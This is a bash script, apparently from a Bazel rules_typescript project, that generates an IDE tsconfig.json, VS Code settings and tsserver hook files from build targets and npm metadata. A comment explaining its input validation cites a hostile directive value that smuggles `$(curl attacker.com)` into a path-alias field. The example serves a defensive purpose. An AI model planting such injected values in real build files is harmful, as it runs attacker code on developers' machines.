#!/usr/bin/env bash
# refresh_tsconfig.sh — Generate a workspace-root tsconfig.json for IDE consumption.
#
# Usage:
#   bazel run //:refresh_tsconfig
#
# What it does:
#   1. Queries all ts_compile targets in the workspace via `bazel query`.
#   2. For each target, derives the Bazel package path (e.g. "src/utils").
#   3. Writes a workspace-root tsconfig.json with:
#      - compilerOptions.paths mapping each package to its source directory
#      - compilerOptions.rootDirs including bazel-bin so the IDE can find .d.ts
#      - references pointing to each package's tsconfig.json (when one exists)
#   4. Writes a VS Code workspace settings template (.vscode/settings.json.template).
#
# The generated tsconfig.json is for IDE use only — it is NOT used by Bazel
# itself.  Bazel generates per-target tsconfigs inside the action sandbox.
#
# Re-run this script whenever you add or remove ts_compile targets.

set -euo pipefail

# ── Locate workspace root ──────────────────────────────────────────────────────
# When run with `bazel run`, BUILD_WORKSPACE_DIRECTORY is set to the workspace
# root by Bazel (since Bazel 5).
if [[ -z "${BUILD_WORKSPACE_DIRECTORY:-}" ]]; then
  echo "ERROR: BUILD_WORKSPACE_DIRECTORY is not set." >&2
  echo "Run this script via:  bazel run //:refresh_tsconfig" >&2
  exit 1
fi

WORKSPACE="$BUILD_WORKSPACE_DIRECTORY"
cd "$WORKSPACE"

# ── Helpers ────────────────────────────────────────────────────────────────────
log() { echo "[refresh_tsconfig] $*"; }

# bazel-bin symlink relative to workspace root
BAZEL_BIN="bazel-bin"

# ── Query ts_compile targets ────────────────────────────────────────────────────
log "Querying ts_compile targets..."

# Use bazel query to find all ts_compile rule targets.
# We filter by kind("ts_compile rule") which matches both the wrapper macro
# output and the underlying _ts_compile_rule.  The query result is a list of
# target labels, one per line, e.g.:
#   //src/utils:utils
#   //src/components:components
TARGETS=$(bazel query 'kind("ts_compile rule", //...)' 2>/dev/null || true)

if [[ -z "$TARGETS" ]]; then
  log "No ts_compile targets found. Is this a rules_typescript workspace?"
  log "Generating a minimal tsconfig.json with just rootDirs..."
  TARGETS=""
fi

# ── Extract unique packages ────────────────────────────────────────────────────
# From each label like //src/utils:utils, extract the package path: src/utils
declare -a PACKAGES=()
declare -A SEEN_PACKAGES=()

while IFS= read -r label; do
  [[ -z "$label" ]] && continue
  # Strip leading // and take everything before the colon.
  pkg="${label#//}"
  pkg="${pkg%%:*}"
  # Skip the root package (empty string)
  [[ -z "$pkg" ]] && continue
  if [[ -z "${SEEN_PACKAGES[$pkg]+x}" ]]; then
    PACKAGES+=("$pkg")
    SEEN_PACKAGES["$pkg"]=1
  fi
done <<< "$TARGETS"

log "Found ${#PACKAGES[@]} packages with ts_compile targets."

# ── Generate tsconfig.json ─────────────────────────────────────────────────────
TSCONFIG="$WORKSPACE/tsconfig.json"
log "Writing $TSCONFIG ..."

# ── Extract path aliases from Gazelle directives ────────────────────────────────
# Read # gazelle:ts_path_alias directives from root BUILD.bazel and any
# BUILD.bazel files in the workspace. These directives map TypeScript path
# alias prefixes (e.g. "@/") to workspace-relative directories (e.g. "src/"),
# allowing the IDE to resolve path-aliased imports correctly.
#
# Format:  # gazelle:ts_path_alias <alias_prefix> <workspace-relative-dir>
# Example: # gazelle:ts_path_alias @/ src/
ALIAS_PATHS_ENTRIES=""

declare -A SEEN_ALIAS_KEYS=()

while IFS= read -r line; do
  # Extract alias and directory from the directive value
  # The directive format after stripping the prefix is: <alias> <dir>
  directive_value="${line#*gazelle:ts_path_alias }"
  # Split on first space
  alias_prefix="${directive_value%% *}"
  alias_dir="${directive_value#* }"

  # Normalise: strip trailing slashes, skip empty or invalid entries
  alias_prefix="${alias_prefix%/}"
  alias_dir="${alias_dir%/}"
  [[ -z "$alias_prefix" || -z "$alias_dir" || "$alias_prefix" == "$alias_dir" ]] && continue
  # Validate alias values against a safe character set to prevent shell injection.
  # A malicious directive like `# gazelle:ts_path_alias @/ $(curl attacker.com)`
  # would otherwise execute during heredoc expansion.
  if [[ ! "$alias_prefix" =~ ^[A-Za-z0-9@/_.*-]+$ ]]; then
    echo "ERROR: unsafe characters in alias prefix: '$alias_prefix'" >&2
    exit 1
  fi
  if [[ ! "$alias_dir" =~ ^[A-Za-z0-9@/_.*-]+$ ]]; then
    echo "ERROR: unsafe characters in alias directory: '$alias_dir'" >&2
    exit 1
  fi
  # Skip if this alias key was already added (first occurrence wins)
  [[ -n "${SEEN_ALIAS_KEYS[$alias_prefix]+x}" ]] && continue
  SEEN_ALIAS_KEYS["$alias_prefix"]=1

  src_dir="./${alias_dir}"
  bin_dir="./$BAZEL_BIN/${alias_dir}"

  ALIAS_PATHS_ENTRIES+="    \"${alias_prefix}\": [\"${src_dir}/index\"],
    \"${alias_prefix}/*\": [\"${src_dir}/*\", \"${bin_dir}/*\"],
"
done < <(python3 - "$WORKSPACE" <<'GREP_PYEOF'
# Walk the workspace tree, collecting # gazelle:ts_path_alias directives from
# BUILD files. Subdirectories that are themselves Bazel workspaces (contain
# MODULE.bazel or WORKSPACE / WORKSPACE.bazel) are skipped entirely — both
# their BUILD files and their children.  This prevents child workspaces under
# tests/, examples/, or e2e/ from polluting the parent workspace's tsconfig.
import os
import re
import sys

workspace = sys.argv[1]

directive_re = re.compile(r"^\s*#\s*gazelle:ts_path_alias\s+")

# The workspace root itself is always included regardless of MODULE.bazel presence.
_WORKSPACE_BOUNDARY_FILES = {"MODULE.bazel", "WORKSPACE", "WORKSPACE.bazel"}

for dirpath, dirnames, filenames in os.walk(workspace):
    # For any directory OTHER than the workspace root, check if it is its own
    # Bazel workspace. If so, skip its BUILD files AND prune its subdirectories.
    if dirpath != workspace:
        is_child_workspace = any(
            os.path.exists(os.path.join(dirpath, b))
            for b in _WORKSPACE_BOUNDARY_FILES
        )
        if is_child_workspace:
            dirnames.clear()
            continue  # skip BUILD files in this directory too

    # Prune "hidden" directories and common non-source directories.
    dirnames[:] = [
        d for d in dirnames
        if not d.startswith(".")
        and d not in ("node_modules", "dist", "build", "bazel-bin", "bazel-out",
                      "bazel-testlogs")
        and not d.startswith("bazel-")
    ]

    for fname in filenames:
        if fname not in ("BUILD.bazel", "BUILD"):
            continue
        fpath = os.path.join(dirpath, fname)
        try:
            with open(fpath) as fh:
                for line in fh:
                    if directive_re.match(line):
                        print(line.rstrip())
        except OSError:
            pass
GREP_PYEOF
)

if [[ -n "$ALIAS_PATHS_ENTRIES" ]]; then
  log "Injecting path aliases from # gazelle:ts_path_alias directives."
fi

# ── Discover npm package types ─────────────────────────────────────────────────
# Read the generated @npm BUILD.bazel from the Bazel output base to find npm
# packages with type declarations, then add them to compilerOptions.paths so
# the IDE can resolve npm imports (e.g. `import { z } from "zod"`).
#
# Strategy:
#   1. Run `bazel info output_base` to find the Bazel output base.
#   2. Locate the @npm external-repo directory under output_base/external/.
#      In bzlmod this is "+npm+npm"; in legacy WORKSPACE it is "npm".
#   3. Parse the BUILD.bazel file directly (no nested bazel call — a nested
#      `bazel query` inside `bazel run` would block on the server lock).
#   4. For each ts_npm_package target that has type declarations, emit an
#      absolute-path entry in compilerOptions.paths.
#
# We use absolute paths because the npm external repo lives outside the
# workspace, so relative paths from the workspace root are fragile.
NPM_PATHS_ENTRIES=""

log "Discovering @npm packages for type declarations..."

# ── Derive output_base ────────────────────────────────────────────────────────
# When a sh_binary is executed via `bazel run`, the script binary is placed at:
#   <output_base>/execroot/_main/bazel-out/<config>/bin/<target_name>
# We extract output_base by stripping everything from "/execroot/" onward in
# BASH_SOURCE[0] ($0).  This correctly handles the case where the outer
# `bazel run` used a non-default --output_base (e.g. the integration test
# harness uses a mktemp directory as the output_base so that each test run is
# isolated).  RUNFILES_DIR is only set for sh_binaries with runfiles; $0 is
# always available and is the most reliable source.
OUTPUT_BASE=""
_script_path="${BASH_SOURCE[0]:-$0}"
if [[ "${_script_path}" == */execroot/* ]]; then
  OUTPUT_BASE="${_script_path%%/execroot/*}"
fi

# Fallback 1: RUNFILES_DIR (for sh_binaries that do have runfiles).
if [[ -z "$OUTPUT_BASE" && -n "${RUNFILES_DIR:-}" && "${RUNFILES_DIR}" == */execroot/* ]]; then
  OUTPUT_BASE="${RUNFILES_DIR%%/execroot/*}"
fi

# Fallback 2: `bazel info output_base` — last resort.  This may return a
# DIFFERENT output_base than the one actually in use (e.g. when the test harness
# passes --output_base=...).  Only used if neither $0 nor RUNFILES_DIR worked.
if [[ -z "$OUTPUT_BASE" ]]; then
  OUTPUT_BASE=$(bazel info output_base 2>/dev/null || true)
fi

if [[ -n "$OUTPUT_BASE" ]]; then
  # Locate the canonical @npm external-repo directory.
  # The canonical name varies by context:
  #   - Root module that owns the extension: "+npm+npm" (parent workspace)
  #   - Root module using a non-root extension: "+npm+npm" (child workspace, same pattern)
  #   - Legacy WORKSPACE mode: "npm"
  #   - Older bzlmod naming in some versions: "rules_typescript++npm+npm" etc.
  #
  # Rather than hard-coding exact names, we scan output_base/external/ for any
  # directory whose BUILD.bazel contains ts_npm_package rules.  The first match
  # whose directory name contains "npm" is taken as the @npm repo.
  NPM_EXTERNAL_DIR=""

  # Quick check for the most common names first (avoids a full scan in typical cases).
  for candidate in \
      "$OUTPUT_BASE/external/+npm+npm" \
      "$OUTPUT_BASE/external/npm"; do
    if [[ -d "$candidate" && -f "$candidate/BUILD.bazel" ]] && \
       grep -q "ts_npm_package" "$candidate/BUILD.bazel" 2>/dev/null; then
      NPM_EXTERNAL_DIR="$candidate"
      break
    fi
  done

  # Fallback: scan all external repos for any that look like an npm package repo.
  # This handles variant canonical names (e.g. "rules_typescript++npm+npm").
  if [[ -z "$NPM_EXTERNAL_DIR" && -d "$OUTPUT_BASE/external" ]]; then
    while IFS= read -r candidate_build; do
      candidate_dir=$(dirname "$candidate_build")
      # Only consider directories whose name contains "npm".
      dir_name=$(basename "$candidate_dir")
      if [[ "$dir_name" != *npm* ]]; then
        continue
      fi
      if grep -q "ts_npm_package" "$candidate_build" 2>/dev/null; then
        NPM_EXTERNAL_DIR="$candidate_dir"
        break
      fi
    done < <(find "$OUTPUT_BASE/external" -maxdepth 2 -name "BUILD.bazel" 2>/dev/null)
  fi

  if [[ -n "$NPM_EXTERNAL_DIR" ]]; then
    # Parse the BUILD.bazel file directly with Python.
    # The BUILD.bazel is generated by npm_translate_lock and contains stanzas like:
    #   ts_npm_package(
    #     name = "zod",
    #     package_name = "zod",
    #     package_dir = "zod__3_24_2/package.json",
    #     exports_types = "zod__3_24_2/index.d.ts",
    #     is_types_package = False,
    #     ...
    #   )
    NPM_PATHS_ENTRIES=$(
      python3 - "$NPM_EXTERNAL_DIR" "$NPM_EXTERNAL_DIR/BUILD.bazel" <<'PYEOF'
import re
import sys
import json
import os

npm_dir = sys.argv[1]
build_path = sys.argv[2]

with open(build_path) as fh:
    content = fh.read()

# Parse ts_npm_package blocks by tracking parenthesis depth.
# This correctly handles multiline glob() calls inside the stanza.
packages = {}  # package_name -> {"exports_types": str|None, "pkg_dir": str|None}

i = 0
while True:
    start = content.find("ts_npm_package(", i)
    if start == -1:
        break

    # Find the matching closing paren.
    depth = 0
    j = start + len("ts_npm_package(") - 1  # at the opening "("
    while j < len(content):
        if content[j] == "(":
            depth += 1
        elif content[j] == ")":
            depth -= 1
            if depth == 0:
                break
        j += 1

    stanza = content[start:j+1]
    i = j + 1

    pkg_name_m = re.search(r'\bpackage_name\s*=\s*"([^"]+)"', stanza)
    exports_types_m = re.search(r'\bexports_types\s*=\s*"([^"]+)"', stanza)
    pkg_dir_m = re.search(r'\bpackage_dir\s*=\s*"([^"]+)"', stanza)
    is_types_m = re.search(r'\bis_types_package\s*=\s*(True|False)', stanza)

    if not pkg_name_m:
        continue

    pkg_name = pkg_name_m.group(1)
    exports_types = exports_types_m.group(1) if exports_types_m else None
    pkg_dir = pkg_dir_m.group(1) if pkg_dir_m else None
    is_types = is_types_m.group(1) == "True" if is_types_m else False

    # Skip @types/* packages — they are paired to runtime packages via types_dep.
    if is_types:
        continue
    # First occurrence wins (primary alias overrides versioned suffix targets).
    if pkg_name in packages:
        continue

    packages[pkg_name] = {
        "exports_types": exports_types,
        "pkg_dir": pkg_dir,
    }

# Resolve the primary .d.ts path for each package.
# Priority:
#   1. exports_types field in BUILD.bazel  (from exports['.']['types'] in package.json)
#   2. "types" / "typings" field in package.json  (legacy top-level declaration field)
#   3. index.d.ts at the package root  (bare convention)
# Packages with no discoverable .d.ts are skipped.

entries = []
for pkg_name, info in sorted(packages.items()):
    dts_rel = info["exports_types"]  # path relative to npm_dir, or None

    if not dts_rel and info["pkg_dir"]:
        # Derive the package subdirectory from the package_dir field
        # by stripping the trailing "/package.json" suffix.
        pkg_subdir = info["pkg_dir"]
        if pkg_subdir.endswith("/package.json"):
            pkg_subdir = pkg_subdir[: -len("/package.json")]
        pkg_json_path = os.path.join(npm_dir, pkg_subdir, "package.json")

        if os.path.exists(pkg_json_path):
            try:
                with open(pkg_json_path) as fh:
                    pj = json.load(fh)
                # Fall back to top-level "types" or "typings" field.
                types_field = pj.get("types") or pj.get("typings") or ""
                if types_field:
                    # Normalise: strip leading "./"
                    types_field = types_field.lstrip("./")
                    dts_rel = "{}/{}".format(pkg_subdir, types_field)
                else:
                    # Last resort: index.d.ts at package root.
                    idx = os.path.join(npm_dir, pkg_subdir, "index.d.ts")
                    if os.path.exists(idx):
                        dts_rel = "{}/index.d.ts".format(pkg_subdir)
            except Exception:
                pass

    if not dts_rel:
        continue

    abs_dts = os.path.join(npm_dir, dts_rel)
    # Skip non-.d.ts paths as a safety guard.
    if not (abs_dts.endswith(".d.ts") or
            abs_dts.endswith(".d.mts") or
            abs_dts.endswith(".d.cts")):
        continue

    # Derive the package directory for wildcard subpath imports.
    # e.g.  zod__3_24_2/index.d.ts  →  npm_dir/zod__3_24_2
    pkg_abs_dir = os.path.dirname(abs_dts)

    entries.append((pkg_name, abs_dts, pkg_abs_dir))

# Emit tab-separated lines for the shell to consume:
# pkg_name <TAB> abs_dts_path <TAB> pkg_abs_dir
for (pkg_name, abs_dts, pkg_abs_dir) in entries:
    print("{}\t{}\t{}".format(pkg_name, abs_dts, pkg_abs_dir))
PYEOF
    ) || true

    if [[ -n "$NPM_PATHS_ENTRIES" ]]; then
      # Count entries (each package has 2 lines: bare + wildcard).
      _npm_count=$(echo "$NPM_PATHS_ENTRIES" | wc -l | tr -d ' ')
      log "Found ${_npm_count} npm packages with type declarations."
    else
      log "No npm packages with type declarations found in @npm repo."
      log "  If you have npm deps, run 'bazel build //...' first to fetch packages,"
      log "  then re-run: bazel run //:refresh_tsconfig"
    fi
  else
    log "WARNING: @npm external repo not found — skipping npm paths."
    log "  If this workspace uses npm deps, run 'bazel build //...' first,"
    log "  then re-run: bazel run //:refresh_tsconfig"
  fi
else
  log "WARNING: Could not determine Bazel output base — skipping npm paths."
fi

# Convert the tab-separated npm entries into JSON paths block entries.
NPM_JSON_ENTRIES=""
while IFS=$'\t' read -r pkg_name abs_dts pkg_abs_dir; do
  [[ -z "$pkg_name" ]] && continue
  NPM_JSON_ENTRIES+="    \"${pkg_name}\": [\"${abs_dts}\"],
    \"${pkg_name}/*\": [\"${pkg_abs_dir}/*\"],
"
done <<< "$NPM_PATHS_ENTRIES"

# Build the paths block — maps each package's module name to its source dir.
# Convention: a package at src/utils is reachable as "@/utils" (if the package
# starts with src/) or as the full package path.
# We generate both forms: "@/<tail>" and the full package path.
PATHS_ENTRIES=""
REFERENCES_ENTRIES=""

for pkg in "${PACKAGES[@]}"; do
  # Path alias: @/<rest-after-src/> if the package starts with src/,
  # otherwise use the full package path as the alias key.
  if [[ "$pkg" == src/* ]]; then
    alias_key="@/${pkg#src/}"
  else
    alias_key="$pkg"
  fi

  # Source directory (relative to workspace root)
  src_dir="./$pkg"
  # bazel-bin compiled .js/.d.ts outputs for this package
  bin_dir="./$BAZEL_BIN/$pkg"

  PATHS_ENTRIES+="    \"${alias_key}\": [\"${src_dir}/index\"],
    \"${alias_key}/*\": [\"${src_dir}/*\", \"${bin_dir}/*\"],
"

  # References: include a per-package tsconfig.json if it exists.
  pkg_tsconfig="$WORKSPACE/$pkg/tsconfig.json"
  if [[ -f "$pkg_tsconfig" ]]; then
    REFERENCES_ENTRIES+="    { \"path\": \"./$pkg\" },
"
  fi
done

# Merge all path entries with priority ordering:
#   1. Directive-sourced aliases (# gazelle:ts_path_alias) — highest priority
#   2. npm package paths — come next so they appear before workspace packages
#   3. Workspace package paths (ts_compile targets) — lowest priority
# Earlier entries take precedence; later duplicates are shadowed by TypeScript.
ALL_PATHS_ENTRIES="${ALIAS_PATHS_ENTRIES}${NPM_JSON_ENTRIES}${PATHS_ENTRIES}"

# Trim trailing comma+newline from the last entries for valid JSON.
ALL_PATHS_ENTRIES="${ALL_PATHS_ENTRIES%,
}"
REFERENCES_ENTRIES="${REFERENCES_ENTRIES%,
}"

# Build references array (may be empty)
if [[ -n "$REFERENCES_ENTRIES" ]]; then
  REFS_BLOCK="\"references\": [
$REFERENCES_ENTRIES  ],"
else
  REFS_BLOCK="\"references\": [],"
fi

# Build paths block (may be empty)
if [[ -n "$ALL_PATHS_ENTRIES" ]]; then
  PATHS_BLOCK="\"paths\": {
$ALL_PATHS_ENTRIES    },"
else
  PATHS_BLOCK=""
fi

cat > "$TSCONFIG" <<EOF
{
  "_comment": "Generated by 'bazel run //:refresh_tsconfig'. Do not edit manually — re-run to update.",
  "compilerOptions": {
    "strict": true,
    "target": "ES2022",
    "module": "Preserve",
    "moduleResolution": "Bundler",
    "jsx": "react-jsx",
    "declaration": true,
    "sourceMap": true,
    "skipLibCheck": true,
    "esModuleInterop": true,
    "allowArbitraryExtensions": true,
    "rootDirs": [
      ".",
      "./$BAZEL_BIN"
    ],
    "baseUrl": ".",
    $PATHS_BLOCK
    "noEmit": true
  },
  $REFS_BLOCK
  "exclude": [
    "bazel-*",
    "node_modules",
    "dist",
    "build",
    ".next",
    ".nuxt"
  ]
}
EOF

log "Wrote $TSCONFIG"

# ── Copy tsserver hook scripts to .bazel/ ─────────────────────────────────────
# Copy tools/tsserver-hook.js and tools/tsserver-hook-worker.js into a .bazel/
# directory at the workspace root so that consumers do not need to reference
# the rules_typescript runfiles path directly in their VS Code settings.
#
# The .bazel/ directory is workspace-specific generated output (like .vscode/
# for IDE settings) and should be added to .gitignore.
BAZEL_TOOLS_DIR="$WORKSPACE/.bazel"
mkdir -p "$BAZEL_TOOLS_DIR"

# Locate the hook scripts.  When run via `bazel run`, the script's runfiles
# are available under $RUNFILES_DIR.  We search a few well-known locations.
_find_hook_script() {
  local name="$1"
  # 1. Sibling of this script in the source tree (development workflow).
  local sibling="$(dirname "${BASH_SOURCE[0]}")/${name}"
  [[ -f "$sibling" ]] && { echo "$sibling"; return; }

  # 2. rules_typescript runfiles tree (consumer workflow).
  if [[ -n "${RUNFILES_DIR:-}" ]]; then
    local rf="${RUNFILES_DIR}/_main/tools/${name}"
    [[ -f "$rf" ]] && { echo "$rf"; return; }
    # Rules_typescript may be loaded under its module name.
    rf="${RUNFILES_DIR}/rules_typescript/tools/${name}"
    [[ -f "$rf" ]] && { echo "$rf"; return; }
  fi

  echo ""
}

_HOOK_SRC="$(_find_hook_script tsserver-hook.js)"
_WORKER_SRC="$(_find_hook_script tsserver-hook-worker.js)"

if [[ -n "$_HOOK_SRC" && -n "$_WORKER_SRC" ]]; then
  cp "$_HOOK_SRC" "$BAZEL_TOOLS_DIR/tsserver-hook.js"
  cp "$_WORKER_SRC" "$BAZEL_TOOLS_DIR/tsserver-hook-worker.js"
  log "Copied tsserver hook scripts to $BAZEL_TOOLS_DIR/"
else
  log "WARNING: tsserver hook scripts not found — skipping copy to .bazel/."
  log "  Hook source: ${_HOOK_SRC:-not found}"
  log "  Worker source: ${_WORKER_SRC:-not found}"
fi

# ── Generate .vscode/settings.json.template ────────────────────────────────────
VSCODE_DIR="$WORKSPACE/.vscode"
SETTINGS_TEMPLATE="$VSCODE_DIR/settings.json.template"

mkdir -p "$VSCODE_DIR"

# Only write if the template doesn't already exist, to avoid overwriting user
# customizations.  Users can re-run with --force to overwrite.
if [[ ! -f "$SETTINGS_TEMPLATE" ]] || [[ "${1:-}" == "--force" ]]; then
  log "Writing $SETTINGS_TEMPLATE ..."
  cat > "$SETTINGS_TEMPLATE" <<'VSCODE_EOF'
{
  "_instructions": "Copy this file to .vscode/settings.json (or merge it into your existing settings.json). This file is intentionally named .template so it does not conflict with your personal VS Code settings.",

  "typescript.tsdk": "node_modules/typescript/lib",
  "typescript.enablePromptUseWorkspaceTsdk": true,
  "typescript.preferences.importModuleSpecifier": "relative",

  "typescript.tsserver.pluginPaths": [],

  "typescript.tsserver.nodePath": "node",

  "typescript.tsserver.userDataDir": null,

  "typescript.tsserver.log": "off",

  "typescript.tsserver.maxTsServerMemory": 4096,

  "editor.formatOnSave": true,
  "editor.defaultFormatter": "esbenp.prettier-vscode",
  "[typescript]": {
    "editor.defaultFormatter": "esbenp.prettier-vscode"
  },
  "[typescriptreact]": {
    "editor.defaultFormatter": "esbenp.prettier-vscode"
  },

  "files.watcherExclude": {
    "**/bazel-bin/**": true,
    "**/bazel-out/**": true,
    "**/bazel-testlogs/**": true,
    "**/bazel-rules_typescript/**": true
  },
  "search.exclude": {
    "**/bazel-bin": true,
    "**/bazel-out": true,
    "**/bazel-testlogs": true,
    "**/bazel-rules_typescript": true
  }
}
VSCODE_EOF
  log "Wrote $SETTINGS_TEMPLATE"
else
  log "$SETTINGS_TEMPLATE already exists — skipping (run with --force to overwrite)."
fi

# ── Generate .bazel/tsserver-launch.json ──────────────────────────────────────
# A VS Code launch configuration that starts tsserver with the Bazel hook
# loaded via --require.  Users can copy this snippet into their launch.json.
TSSERVER_LAUNCH="$BAZEL_TOOLS_DIR/tsserver-launch.json"
cat > "$TSSERVER_LAUNCH" <<'TSLAUNCH_EOF'
{
  "_instructions": "Paste the 'typescript.tsserver.nodePath' and 'typescript.tsserver.nodePath' lines from this file into your .vscode/settings.json to enable Bazel-aware module resolution in tsserver.",

  "_comment": "The --require flag loads the Bazel resolution hook before TypeScript starts. The hook patches ts.resolveModuleName so that imports like 'import { z } from \"zod\"' resolve directly to the .d.ts files in the Bazel output base — no need to run 'bazel build' first for IDE support.",

  "typescript.tsserver.nodePath": "node",

  "typescript.tsserver.pluginPaths": [],

  "_nodeOptions": "Set this as 'typescript.tsserver.nodeOptions' in your settings.json:",
  "typescript.tsserver.nodeOptions": "--require .bazel/tsserver-hook.js"
}
TSLAUNCH_EOF
log "Wrote $TSSERVER_LAUNCH"

# ── Summary ────────────────────────────────────────────────────────────────────
echo ""
echo "Done.  IDE tsconfig generated at:"
echo "  $TSCONFIG"
echo ""
echo "Next steps:"
echo "  1. Open VS Code in the workspace root."
echo "  2. If you haven't already, copy .vscode/settings.json.template to .vscode/settings.json"
echo "  3. To enable Bazel-aware module resolution in tsserver, add to .vscode/settings.json:"
echo "       \"typescript.tsserver.nodeOptions\": \"--require .bazel/tsserver-hook.js\""
echo "  4. Run 'bazel build //...' once to populate bazel-bin with .d.ts files."
echo "  5. Restart the TypeScript language server in VS Code:"
echo "     Cmd+Shift+P → 'TypeScript: Restart TS Server'"
echo ""
echo "The tsserver hook scripts are in .bazel/:"
echo "  .bazel/tsserver-hook.js"
echo "  .bazel/tsserver-hook-worker.js"
echo "  .bazel/tsserver-launch.json  (VS Code integration reference)"
echo ""
echo "Re-run this command whenever you add or remove ts_compile targets:"
echo "  bazel run //:refresh_tsconfig"
